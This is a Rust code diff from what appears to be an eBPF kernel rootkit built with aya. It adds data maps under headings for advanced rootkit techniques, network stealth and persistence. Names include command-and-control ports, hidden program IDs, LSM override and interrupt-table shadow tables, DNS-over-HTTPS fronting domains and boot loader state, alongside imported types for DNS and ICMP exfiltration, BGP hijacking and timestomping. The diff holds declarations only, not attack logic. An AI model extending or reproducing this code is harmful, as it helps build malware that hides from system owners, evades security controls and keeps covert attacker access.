@@ -3,9 +3,9 @@ use aya_ebpf::{
     maps::{HashMap, PerCpuArray, ProgramArray, RingBuf},
 };
 use common::{
-    BgpHijackEntry, ContainerProbeResult, DnsExfilChunk, IcmpExfilPayload, PhantomConnState,
-    PortKnockConfig, PortKnockState, ProcSpoofEntry, RootkitConfig, SlackHideEntry,
-    SupplyChainTarget, TimestompEntry,
+    BgpHijackEntry, ContainerProbeResult, DnsExfilChunk, IcmpExfilPayload, LsmOverrideEntry,
+    PhantomConnState, PortKnockConfig, PortKnockState, ProcSpoofEntry, RootkitConfig,
+    SlackHideEntry, SupplyChainTarget, TaskPatchRecord, TimestompEntry, TrafficProfile,
 };
 
 #[map]
@@ -392,3 +392,66 @@ pub(crate) static PARASITE_TARGETS: HashMap<u32, u32> = HashMap::with_max_entrie
 
 #[map]
 pub(crate) static HIJACK_PROG_ARRAY: ProgramArray = ProgramArray::with_max_entries(16, 0);
+
+// ──────────────────────────────────────────────
+// Category 1: Advanced Rootkit Techniques Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static TASK_PATCH_TABLE: HashMap<u32, TaskPatchRecord> =
+    HashMap::with_max_entries(32, 0);
+
+#[map]
+pub(crate) static LSM_OVERRIDE_TABLE: HashMap<u32, LsmOverrideEntry> =
+    HashMap::with_max_entries(64, 0);
+
+#[map]
+pub(crate) static IDT_SHADOW: aya_ebpf::maps::Array<u64> =
+    aya_ebpf::maps::Array::with_max_entries(256, 0);
+
+#[map]
+pub(crate) static HIDDEN_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(32, 0);
+
+#[map]
+pub(crate) static LIVEPATCH_TARGETS: HashMap<u64, u64> = HashMap::with_max_entries(16, 0);
+
+// ──────────────────────────────────────────────
+// Category 2: Network Stealth Layer Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static RAW_C2_PORTS: HashMap<u16, u8> = HashMap::with_max_entries(8, 0);
+
+#[map]
+pub(crate) static RAW_C2_STATE: aya_ebpf::maps::Array<u64> =
+    aya_ebpf::maps::Array::with_max_entries(4, 0);
+
+#[map]
+pub(crate) static TC_INJECT_QUEUE: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);
+
+#[map]
+pub(crate) static DOH_FRONT_DOMAINS: HashMap<u32, [u8; 32]> =
+    HashMap::with_max_entries(8, 0);
+
+#[map]
+pub(crate) static TRAFFIC_PROFILE_MAP: aya_ebpf::maps::Array<TrafficProfile> =
+    aya_ebpf::maps::Array::with_max_entries(1, 0);
+
+// ──────────────────────────────────────────────
+// Category 4: Persistence Mechanisms Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static PIN_PATH_TABLE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static CGROUP_PERSIST_STATE: aya_ebpf::maps::Array<u32> =
+    aya_ebpf::maps::Array::with_max_entries(4, 0);
+
+#[map]
+pub(crate) static MODPARAM_TARGETS: HashMap<u64, [u8; 32]> =
+    HashMap::with_max_entries(8, 0);
+
+#[map]
+pub(crate) static BOOT_LOADER_STATE: aya_ebpf::maps::Array<u32> =
+    aya_ebpf::maps::Array::with_max_entries(2, 0);
